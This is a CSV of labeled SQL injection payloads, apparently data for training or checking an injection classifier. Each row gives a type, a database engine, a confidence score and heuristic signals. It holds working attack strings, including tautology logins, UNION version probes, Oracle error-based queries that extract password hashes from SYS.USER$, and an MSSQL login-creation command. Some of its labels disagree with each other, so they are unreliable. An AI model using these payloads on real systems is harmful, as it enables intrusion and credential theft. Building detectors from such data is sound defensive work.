payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"select * from users where id = '1' union select \#,@@VERSION -- 1'",union_based,mssql,0.8,\# + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,210,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' union select \#,@@VERSION -- 1'"
"select * from users where id = 1 or 1#""{ union select 1,version ( ) -- 1",union_based,mysql,0.85,#{ + UNION SELECT for union SQLi,KEEP,,union_based,mysql,211,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#""{ union select 1,version ( ) -- 1"
""" or true--",boolean_blind,generic,0.9,"\ or true-- is boolean blind SQLi""",KEEP,,boolean_blind,generic,212,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,""" or true--"
select * from users where id = 1. or 1 = 1 -- 1,boolean_blind,mysql,0.8,1. for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,213,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1. or 1 = 1 -- 1
"select * from users where id = 1 or "";@"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,"\"";@ obfuscation for boolean blind SQLi""",KEEP,,boolean_blind,mysql,214,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "";@"" or 1 = 1 -- 1"
â or 3 = 3 --,boolean_blind,generic,0.8,or 3=3 with unusual char,KEEP,,boolean_blind,generic,215,boolean_blind,generic,Pattern match: 'or 3 = 3' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",â or 3 = 3 --
AND 1 = utl_inaddr.get_host_address ( ( SELECT global_name FROM global_name ) ) AND 'i' = 'i,error_based,oracle,0.95,utl_inaddr + global_name for Oracle error,KEEP,,error_based,oracle,216,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,AND 1 = utl_inaddr.get_host_address ( ( SELECT global_name FROM global_name ) ) AND 'i' = 'i
"select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.95,+1 + v$version for Oracle union SQLi,KEEP,,union_based,oracle,217,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1"
"select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1",union_based,mssql,0.8,$+%+1 + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,218,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1"
"select * from users where id = 1 or 1#""? union select version ( ) ,version ( ) -- 1",union_based,mysql,0.85,#? union select version() twice,KEEP,,union_based,mysql,219,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#""? union select version ( ) ,version ( ) -- 1"
"select * from users where id = 1 or "" ) 1"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,"\"" ) 1\"" obfuscation for boolean blind""",KEEP,,boolean_blind,mysql,220,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "" ) 1"" or 1 = 1 -- 1"
or uid like '%,boolean_blind,generic,0.8,uid LIKE is generic boolean blind SQLi,KEEP,,boolean_blind,generic,221,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,or uid like '%
select * from users where id = '1' <@&1 or 1 = 1 -- 1',boolean_blind,mysql,0.8,<@&1 for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,222,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = '1' <@&1 or 1 = 1 -- 1'
"select * from users where id = '1' union select !<1,version ( ) -- 1'",union_based,mysql,0.8,!<1 + version() for union SQLi,KEEP,,union_based,mysql,223,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' union select !<1,version ( ) -- 1'"
23 or 1 = 1; --,boolean_blind,generic,0.9,23 or 1=1; is boolean blind SQLi,KEEP,,boolean_blind,generic,224,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",23 or 1 = 1; --
"select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1",union_based,mssql,0.85,\<\. + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,225,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1"
"select * from users where id = 1 or ""{ ( "" = 1 or 1 = 1 -- 1",boolean_blind,mysql,0.8,"\"" { (\"" obfuscation for boolean blind SQLi""",KEEP,,boolean_blind,mysql,226,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""{ ( "" = 1 or 1 = 1 -- 1"
"select * from users where id = 1 or ""%_"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,%_ obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,227,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""%_"" or 1 = 1 -- 1"
select * from users where id = 1 + ( \. ) or 1 = 1 -- 1,boolean_blind,mysql,0.8,( \. ) for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,228,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 + ( \. ) or 1 = 1 -- 1
"select * from users where id = '1' union select \,@@VERSION -- 1'",union_based,mssql,0.8,\ + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,229,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' union select \,@@VERSION -- 1'"
0 or 1 = 1,boolean_blind,generic,0.95,0 or 1=1 is boolean blind SQLi,KEEP,,boolean_blind,generic,230,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",0 or 1 = 1
select * from users where id = 1 &@ or 1 = 1 -- 1,boolean_blind,mysql,0.8,&@ for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,231,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 &@ or 1 = 1 -- 1
"admin"" ) or ""1"" = ""1",auth_bypass,generic,0.9,"admin\) or \""1\""=\""1 for auth bypass""",KEEP,,auth_bypass,generic,232,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"admin"" ) or ""1"" = ""1"
select * from users where id = 1 or \< = 1 or 1 = 1 -- 1,boolean_blind,mysql,0.8,\< = 1 for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,233,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 or \< = 1 or 1 = 1 -- 1
"select * from users where id = 1 or ""??"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,?? obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,234,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""??"" or 1 = 1 -- 1"
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",error_based,oracle,0.95,utl_inaddr + SYS.USER$ error SQLi,KEEP,,error_based,oracle,235,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 5 ) ) AND 'i' = 'i"
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 7 ) ) AND 'i' = 'i",error_based,oracle,0.95,utl_inaddr + all_tab_columns error SQLi,KEEP,,error_based,oracle,236,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 7 ) ) AND 'i' = 'i"
select * from users where id = 1 + $+%$ or 1 = 1 -- 1,boolean_blind,mysql,0.8,$+%$ obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,237,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 + $+%$ or 1 = 1 -- 1
select * from users where id = '1' + $+%\ or 1 = 1 -- 1',boolean_blind,mysql,0.8,$+%\ obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,238,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = '1' + $+%\ or 1 = 1 -- 1'
""" or """"*""",auth_bypass,generic,0.85,"\""\""\""*\""\"" is quote escape auth bypass""",KEEP,,auth_bypass,generic,239,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,""" or """"*"""
"hi or 1 = 1 --""",boolean_blind,generic,0.8,"hi or 1=1 --\ is boolean blind SQLi""",KEEP,,boolean_blind,generic,240,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","hi or 1 = 1 --"""
"select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.95,. union + v$version for Oracle union SQLi,KEEP,,union_based,oracle,241,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1"
"select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'",union_based,oracle,0.95,1^ + v$version for Oracle union SQLi,KEEP,,union_based,oracle,242,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'"
"select * from users where id = '1' union select ""?""_,version ( ) -- 1'",union_based,mysql,0.8,"\?\""_ + version() to union SQLi""",KEEP,,union_based,mysql,243,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' union select ""?""_,version ( ) -- 1'"
select * from users where id = 1 or \<\. or 1 = 1 -- 1,boolean_blind,mysql,0.8,\<\. for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,244,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 or \<\. or 1 = 1 -- 1
Ã½ or 1 = 1 --,boolean_blind,generic,0.8,or 1=1 with unusual char encoding,KEEP,,boolean_blind,generic,245,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",Ã½ or 1 = 1 --
a' --,boolean_blind,generic,0.9,a' -- is boolean blind SQLi,KEEP,,boolean_blind,generic,246,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,a' --
or 1 = 1 /*,boolean_blind,generic,0.9,or 1=1 /* for boolean blind SQLi,KEEP,,boolean_blind,generic,247,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",or 1 = 1 /*
"select * from users where id = '1' union select $ .,@@VERSION -- 1'",union_based,mssql,0.8,$ . + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,248,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' union select $ .,@@VERSION -- 1'"
"exec sp_addlogin 'name' , 'password'",stacked_queries,mssql,0.9,sp_addlogin for MSSQL stacked queries,KEEP,,stacked_queries,mssql,249,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"exec sp_addlogin 'name' , 'password'"
"select * from users where id = 1 union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.95,null + v$version for Oracle union SQLi,KEEP,,union_based,oracle,250,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"select * from users where id = 1 union select null,banner from v$version where rownum = 1 -- 1"
"select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",boolean_blind,mysql,0.8,". ) \ obfuscation for boolean blind""",KEEP,,boolean_blind,mysql,251,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "". ) "" or 1 = 1 -- 1"
"select * from users where id = 1 or @<@ = 1 union select 1,version ( ) -- 1",union_based,mysql,0.85,@<@ = 1 UNION SELECT for union SQLi,KEEP,,union_based,mysql,252,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or @<@ = 1 union select 1,version ( ) -- 1"
group by userid having 1 = 1--,boolean_blind,generic,0.8,group by having for boolean blind SQLi,KEEP,,boolean_blind,generic,253,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,group by userid having 1 = 1--
"select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1",union_based,mssql,0.8,\+%+1 + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,254,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1"
select * from users where id = 1 *1 or 1 = 1 -- 1,boolean_blind,mysql,0.8,*1 or 1=1 for boolean blind SQLi,KEEP,,boolean_blind,mysql,255,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 *1 or 1 = 1 -- 1
"select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1",boolean_blind,mysql,0.8,"@#\; = 1 for boolean blind SQLi""",KEEP,,boolean_blind,mysql,256,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1"
‘ or 1 = 1 --,boolean_blind,generic,0.8,or 1=1 with unusual char,KEEP,,boolean_blind,generic,257,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",‘ or 1 = 1 --
"select * from users where id = 1 *\. union select null,@@VERSION -- 1",union_based,mssql,0.8,*\. + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,258,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 *\. union select null,@@VERSION -- 1"
select * from users where id = 1 % ( @ ) or 1 = 1 -- 1,boolean_blind,mysql,0.8,% (@) for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,259,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 % ( @ ) or 1 = 1 -- 1
or 'a' = 'a,boolean_blind,generic,0.95,or 'a'='a' is boolean blind SQLi,KEEP,,boolean_blind,generic,260,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,or 'a' = 'a
"select * from users where id = 1 union select 1<@,version ( ) -- 1",union_based,mysql,0.8,1<@ + version() for union SQLi,KEEP,,union_based,mysql,261,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select 1<@,version ( ) -- 1"
"select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1",union_based,mssql,0.8,\+*\* + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,262,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1"
select * from users where id = 1 + ( 1 ) or 1 = 1 -- 1,boolean_blind,mysql,0.8,+ (1) or 1=1 for boolean blind SQLi,KEEP,,boolean_blind,mysql,263,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 + ( 1 ) or 1 = 1 -- 1
"select * from users where id = 1 union select @ 1$,version ( ) -- 1",union_based,mysql,0.8,@ 1$ + version() for union SQLi,KEEP,,union_based,mysql,264,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select @ 1$,version ( ) -- 1"
"select * from users where id = 1 union select @ 1a,version ( ) -- 1",union_based,mysql,0.8,@ 1a + version() for union SQLi,KEEP,,union_based,mysql,265,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select @ 1a,version ( ) -- 1"
"select * from users where id = 1 or @$# = 1 union select 1,version ( ) -- 1",union_based,mysql,0.8,@$# = 1 UNION SELECT for union SQLi,KEEP,,union_based,mysql,266,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or @$# = 1 union select 1,version ( ) -- 1"
"select * from users where id = '1' or ( \. ) = 1 union select 1,@@VERSION -- 1'",boolean_blind,mysql,0.8,(\. ) = 1 for boolean blind SQLi,KEEP,,boolean_blind,mysql,267,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' or ( \. ) = 1 union select 1,@@VERSION -- 1'"
"select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'",union_based,oracle,0.8,"1\!\"" + v$version for Oracle union SQLi""",KEEP,,union_based,oracle,268,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'"
"select * from users where id = 1 or ""1]"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,1] obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,269,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""1]"" or 1 = 1 -- 1"
"select * from users where id = 1 or ""$?"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,$? obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,270,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""$?"" or 1 = 1 -- 1"
or x = x,boolean_blind,generic,0.95,or x=x is generic boolean blind SQLi,KEEP,,boolean_blind,generic,271,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,or x = x
or a = a,boolean_blind,generic,0.95,or a=a is generic boolean blind SQLi,KEEP,,boolean_blind,generic,272,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,or a = a
or '1' = '1,boolean_blind,generic,0.95,or '1'='1' is boolean blind SQLi,KEEP,,boolean_blind,generic,273,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,or '1' = '1
"select * from users where id = 11<1# union select 1,version ( ) -- 1",union_based,mysql,0.85,<1# union select for union SQLi,KEEP,,union_based,mysql,274,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 11<1# union select 1,version ( ) -- 1"
) ) or ( ( 'x' ) ) = ( ( 'x,boolean_blind,generic,0.8,)) or (('x')) = (('x for boolean blind,KEEP,,boolean_blind,generic,275,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,) ) or ( ( 'x' ) ) = ( ( 'x
"select * from users where id = '1' or \.<1 union select 1,@@VERSION -- 1'",union_based,mssql,0.85,\.<1 + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,276,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' or \.<1 union select 1,@@VERSION -- 1'"
"select * from users where id = '1' <@&1 union select 1,version ( ) -- 1'",union_based,mysql,0.85,<@&1 union select for union SQLi,KEEP,,union_based,mysql,277,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' <@&1 union select 1,version ( ) -- 1'"
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",error_based,oracle,0.95,utl_inaddr + sys.all_tables error SQLi,KEEP,,error_based,oracle,278,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 4 ) ) AND 'i' = 'i"
